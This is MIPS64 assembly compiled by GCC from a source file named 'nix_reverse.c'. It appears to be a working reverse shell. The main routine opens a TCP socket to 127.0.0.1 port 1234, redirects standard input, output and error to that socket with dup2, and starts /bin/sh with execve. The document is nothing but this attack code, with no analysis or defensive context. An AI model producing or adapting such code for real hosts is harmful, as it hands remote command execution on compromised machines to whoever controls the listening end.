	.file	1 "nix_reverse.c"
	.section .mdebug.abi64
	.previous
	.nan	legacy
	.module	fp=64
	.module	oddspreg
	.abicalls
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align	3
.LC0:
	.ascii	"/bin/sh\000"
	.section	.text.startup,"ax",@progbits
	.align	2
	.globl	main
	.set	nomips16
	.set	nomicromips
	.ent	main
	.type	main, @function
main:
	.frame	$sp,80,$31		# vars= 48, regs= 3/0, args= 0, gp= 0
	.mask	0x90010000,-8
	.fmask	0x00000000,0
	.set	noreorder
	.set	nomacro
	daddiu	$sp,$sp,-80
	sd	$28,64($sp)
	lui	$28,%hi(%neg(%gp_rel(main)))
	daddu	$28,$28,$25
	daddiu	$28,$28,%lo(%neg(%gp_rel(main)))
	ld	$25,%call16(socket)($28)
	move	$6,$0
	li	$5,2			# 0x2
	li	$4,2			# 0x2
	li	$2,16777216			# 0x1000000
	sd	$31,72($sp)
	sd	$16,56($sp)
	daddiu	$2,$2,127
	.reloc	1f,R_MIPS_JALR,socket
1:	jalr	$25
	sd	$2,32($sp)

	ld	$25,%call16(connect)($28)
	move	$16,$2
	li	$2,2			# 0x2
	sh	$2,16($sp)
	li	$2,-11772			# 0xffffffffffffd204
	sh	$2,18($sp)
	lw	$2,32($sp)
	li	$6,16			# 0x10
	sw	$2,20($sp)
	lw	$2,36($sp)
	daddiu	$5,$sp,16
	move	$4,$16
	.reloc	1f,R_MIPS_JALR,connect
1:	jalr	$25
	sw	$2,24($sp)

	ld	$25,%call16(dup2)($28)
	move	$4,$16
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	move	$5,$0

	ld	$25,%call16(dup2)($28)
	move	$4,$16
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	li	$5,1			# 0x1

	ld	$25,%call16(dup2)($28)
	move	$4,$16
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	li	$5,2			# 0x2

	ld	$4,%got_page(.LC0)($28)
	ld	$25,%call16(execve)($28)
	daddiu	$4,$4,%got_ofst(.LC0)
	move	$5,$sp
	move	$6,$0
	sd	$4,0($sp)
	.reloc	1f,R_MIPS_JALR,execve
1:	jalr	$25
	sd	$0,8($sp)

	ld	$31,72($sp)
	ld	$28,64($sp)
	ld	$16,56($sp)
	move	$2,$0
	jr	$31
	daddiu	$sp,$sp,80

	.set	macro
	.set	reorder
	.end	main
	.size	main, .-main
	.ident	"GCC: (Debian 6.3.0-18) 6.3.0 20170516"
